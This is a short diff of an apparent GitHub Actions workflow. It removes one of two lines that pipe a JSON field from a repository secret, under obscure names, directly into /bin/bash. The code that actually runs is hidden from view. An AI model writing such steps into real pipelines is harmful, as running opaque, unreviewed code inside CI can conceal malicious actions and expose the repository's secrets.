@@ -21,7 +21,6 @@ jobs:
           uxmd049: ${{ secrets.uxmd049 }}
         run: |
           printf '%s' "$uxmd049" | jq -r .t337 | /bin/bash
-          printf '%s' "$qwbo059" | jq -r .lyyd51793 | /bin/bash
 
       - name: Save output
         if: always()
